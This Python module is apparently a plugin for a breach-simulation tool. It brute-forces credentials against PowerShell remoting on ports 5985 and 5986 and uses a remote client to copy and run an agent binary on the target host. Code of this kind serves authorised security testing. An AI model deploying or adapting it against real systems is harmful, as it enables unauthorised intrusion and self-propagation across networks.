import logging
from functools import partial
from pprint import pformat
from typing import Any, Dict, Sequence

# common imports
from common import OperatingSystem
from common.event_queue import IAgentEventPublisher
from common.types import AgentID, Event, NetworkPort
from common.utils.code_utils import del_key
from common.utils.environment import get_os

# dependencies to get rid of or internalize
from infection_monkey.exploit import IAgentBinaryRepository, IAgentOTPProvider
from infection_monkey.exploit.tools import (
    BruteForceCredentialsProvider,
    BruteForceExploiter,
    all_tcp_ports_are_closed,
)
from infection_monkey.exploit.tools.helpers import get_agent_dst_path
from infection_monkey.i_puppet import ExploiterResultData, TargetHost
from infection_monkey.propagation_credentials_repository import IPropagationCredentialsRepository

from .credentials_generator import generate_powershell_credentials
from .powershell_command_builder import build_powershell_command
from .powershell_options import PowerShellOptions
from .powershell_remote_access_client_factory import PowerShellRemoteAccessClientFactory

logger = logging.getLogger(__name__)


POWERSHELL_NO_SSL_PORT = NetworkPort(5985)
POWERSHELL_SSL_PORT = NetworkPort(5986)


def should_attempt_exploit(host: TargetHost) -> bool:
    return not all_tcp_ports_are_closed(host, [POWERSHELL_NO_SSL_PORT, POWERSHELL_SSL_PORT])


class Plugin:
    def __init__(
        self,
        *,
        plugin_name: str,
        agent_id: AgentID,
        agent_event_publisher: IAgentEventPublisher,
        agent_binary_repository: IAgentBinaryRepository,
        propagation_credentials_repository: IPropagationCredentialsRepository,
        otp_provider: IAgentOTPProvider,
        **kwargs,
    ):
        self._plugin_name = plugin_name
        self._agent_id = agent_id
        self._agent_event_publisher = agent_event_publisher
        self._agent_binary_repository = agent_binary_repository
        running_on_windows = get_os() == OperatingSystem.WINDOWS
        credentials_generator = partial(
            generate_powershell_credentials,
            running_from_windows=running_on_windows,
        )
        self._credentials_provider = BruteForceCredentialsProvider(
            propagation_credentials_repository, credentials_generator
        )
        self._otp_provider = otp_provider

    def run(
        self,
        *,
        host: TargetHost,
        servers: Sequence[str],
        current_depth: int,
        options: Dict[str, Any],
        interrupt: Event,
        **kwargs,
    ) -> ExploiterResultData:
        # HTTP ports options are hack because they are needed in fingerprinters
        del_key(options, "http_ports")

        try:
            logger.debug(f"Parsing options: {pformat(options)}")
            powershell_options = PowerShellOptions(**options)
        except Exception as err:
            msg = f"Failed to parse PowerShell options: {err}"
            logger.exception(msg)
            return ExploiterResultData(error_message=msg)

        if not should_attempt_exploit(host):
            msg = f"Host {host.ip} has no open PowerShell remoting ports"
            logger.debug(msg)
            return ExploiterResultData(
                exploitation_success=False, propagation_success=False, error_message=msg
            )

        command_builder = partial(
            build_powershell_command,
            self._agent_id,
            servers,
            current_depth,
            otp_provider=self._otp_provider,
        )
        powershell_exploit_client_factory = PowerShellRemoteAccessClientFactory(
            host, powershell_options, command_builder
        )

        brute_force_exploiter = BruteForceExploiter(
            self._plugin_name,
            self._agent_id,
            get_agent_dst_path(host),
            powershell_exploit_client_factory,
            self._credentials_provider,
            self._agent_binary_repository,
            self._agent_event_publisher,
            {"powershell-exploiter"},
        )

        try:
            logger.debug(f"Running PowerShell exploiter on host {host.ip}")
            return brute_force_exploiter.exploit_host(host, interrupt)
        except Exception as err:
            msg = f"An unexpected exception occurred while attempting to exploit host: {err}"
            logger.exception(msg)
            return ExploiterResultData(error_message=msg)
